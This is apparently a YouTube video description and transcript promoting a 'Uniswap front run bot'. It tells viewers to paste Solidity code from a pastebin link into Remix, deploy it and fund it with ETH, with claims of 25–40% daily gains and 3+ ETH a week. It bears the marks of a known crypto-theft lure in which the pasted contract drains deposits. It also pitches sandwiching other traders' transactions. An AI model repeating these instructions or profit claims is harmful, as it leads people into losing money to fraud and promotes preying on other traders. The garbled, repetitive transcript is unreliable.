title: HOW TO DEPLOY UNISWAP Front Run Bot for ETH | (No Downloads) [10/25/2022 Working]
description: :fire: Uniswap and 1inchSwap, Sushiswap is a cryptocurrency exchange that uses a decentralized network protocol. If you are trading crypto on Uniswap, 1inch or any other decentralized exchange (DEX), you need to know about bots working in the future. Automated trading on Uniswap and other defi platforms can be used to make insane profits. In this video, I show you how to set up my front-end bot that will automatically trade, generate passive income, and enjoy everything you want in life, without having to follow typical manual trading methods.  :check mark button:For your questions, you can PM me on Telegram: (Please only ask contract-related questions) https://t.me/Khalifa1337  :check mark button: 1. Download MetaMask:  • https://metamask.io/  :check mark button: 2. Access Remix Project Site:  • https://remix.ethereum.org  If you've done anything on the Remix site before, don't forget to delete the cookies. You can clear all cookies with the trash icon in the "Workspaces" section at the top left.  :check mark button: 3. Click on the “Contracts” folder and then create “New File”. Rename it whatever you want, or: “bot.sol”  Note: There is a problem if the text is not colored when you create bot.sol and paste the codes from pastebin, try again. If the codes are not colored, you cannot proceed to the next step.  :check mark button: 4. Paste this code into Remix Project:  • https://pastebin.com/raw/UPBfAALj  :check mark button: 5. Go to the "Solidity Compiler" tab, select version "0.6.6+commit.6c089d02" and then select "Compile bot.sol".  Make sure "UniswapFrontrunBot (bot.sol)" is selected in the CONTRACT section of the SOLIDITY COMPILER section.  :check mark button: 6. Go to the “DEPLOY & RUN TRANSACTIONS” tab, select the “Injected Web 3” environment, then “Deploy”. You create your own contract by confirming the Metamask Contract creation fee.  :check mark button: 7. Deposit to secure your bot contract address  :check mark button:8. After your transaction is confirmed, click the "start" button to run the bot. Withdraw money at any time by clicking the "Withdraw" button  I know it seems complicated, but I tried to explain it in the simplest way for you, I hope you can easily create your contract and start trading. :hugging face::hugging face:  :minus::minus::minus::minus::minus::minus::minus::minus::minus::minus::minus::minus::minus::minus::minus::minus:  :police car light: Share your profits in the comments below, and like & subscribe for more solidity tutorials.  :minus::minus::minus::minus::minus::minus::minus::minus::minus::minus::minus::minus::minus::minus::minus::minus:  :police car light: EDIT: I got messages from people who didn't fund the contract enough to cover gas fees and possible burn fees. Bot targets token contracts with max 10% burn fee and anything lower but nowadays most of tokens comes with 3~6% fees. If you fund the contract with 0.4ETH or less and the bot targets another token with high burn fees the contract will basically waste in fees more than make profit. I recommend funding the contract with around 0.5 - 1 ETH just to make sure that won't happen.  #ethereum #crypto #cryptocurrencies #flashbot #arbitagebot #usdt #tether #USDTether #USDTether #USDC #NFTCommunity #nft #nftcollectors #ETH #EthereumMerge #ETHUSDT #btc  #BNB  #Binance  #Crypto #coinbase

asr.full_text: And so today we will be talking about building a tricky smart contract bot build on Solidity that gives me an easy, easy passive income. In a few words, my bot allows you to automatically trade a given token for the Ethereum blockchain without having to go through the tipeal transaction methods. This is going to allow us to sniff the mempool, or basically look for transactions that are pending to be made within a block, and it is going to allow us to sniff the mempool, or basically look for transactions that are pending to be made within a block, and it is going to allow us to inject out transaction with a higher gas fee, one gwei higher than the transaction which is trying to be entered. This will allow our transaction to be processed first, and then we will also process a sell order within the same block. So essentially the victim's transaction gets sandwiched between hours and we make a profit after slippage difference in the transaction. To start off make sure you have Metamask installed and connected to the ethereum mainnet. If you do not have Metamask installed I will put the link in the description on how to install it. So we go to remix ethereum compiler . github.io, remake ethereum which is a web 3 app allowing us to develop, deploy, compile, and launch smart contracts. Which are coded in the solidity language. You can find the link in the description below. Head over to the sidebar on the left and create a new contract under Contracts folder. We're going to name it Bot.Sol. So, next, if you look at the description, I've included a link to this code. You just need to copy and paste that. This is our frontrunner bot contract that I've created. A couple of items to look at here are lines 50 and 51. If you follow those addresses on etherscan, you will see that these addresses of wrapped Ether token, which will be competing with them. You can specify the coin target by filling lines 50 and 51, or leave them unchanged for scanning for new liquidity pairings. Yep, as you see, it's the official wrapped Ether address. Always check that… So let's get back to remix now that we have our bot file ready. Let's compile it… As you see, it's built with 0.6.6 version of Solidity. Now under compiler we are going to our version 0.6.6 so it matches our contract. Make sure the language is set to solidity and EVM version to Compiler default. Now we need to click on the Compile bot dot sole button, and wait for the file to compile. So we deploy this to our wallet. Go to deploy and runMask to Remix. We now have a deployment utility right here. I'll click the deploy button. After successful deployment we'll need to confirm the creation of our contract by paying some gas fees. It took me a few amount of gas here, it's the commission of Ethereum's network for contract deployment. I always set gas fee to High, not a lot of difference. So let's click confirm and wait for the transaction to be confirmed. Finally, we have confirmation right here. Now our contract is deployed! As we can see here there there are four actions for a contract Start button will start the bot sniffing the meme pool Withdrawal will stop the bot and transfer funds back to your wallet Token name and token symbols speak for themselves So let's copy the contract address and make sure it was created I'm going to head back to aether scan and paste it yep it was created successfully so the next step is to fund the contract with some coins to be able to snipe liquidity pools I'm going to copy this address and head back over to my meta mask make sure you got the right address in there you can fund the track with however many ether you want but the more you put in I wanna head back to my metamask. Make sure you got the right address in there. You can fund the track with however many ethers you want, but the more you put you put in, the larger transaction you'll be able to front run, and the more profit you'll be able to make. So for instance, if you're only able to front run with say like $300, you're not gonna be able to create as much slippage in the price as if you were inserting $30,000. There we go. transaction confirmed! So it was sent to the contract. We can check if by following our contract address on Etherscan.io. So, the contract has one Ethereum on its balance, which is basically the amount we have funded it with. So, the next step here is to click start. This will start the bot sniffing the mempool to find different liquidity pairs in order for you to front run transactions. Well, guys, I want to share the profit, bot made for me. So I have something around 1.26 ether, which is around 25 percent. I will withdraw my profit after 24 hours after bot runtime. So I'll see you in about 4 hours. Let's see… what do we have here. Oh it's about 1.4 Ether. So basically it took me about a day to gain my deposit by more than a third. Something close to 40%. Which is not too bad. So the bot will close to 40%, which isn't that bad. So, the bot will continue to run until you press the withdraw button. The bot will exit the liquidity pool and will send the Ether you entered initially, plus the profit, back to your wallet. So, let's click it. This will charge us a little bit of gas. I'll set it to high again and click Confirm. There we go, transaction confirmed. Let's go to the metamask check. What do I have there? Yeap, you can see my balance here. I've had three weeks where I made 5-6 ethers. Sometimes it's not always profitable but usually I make 3 plus aetherium a week.
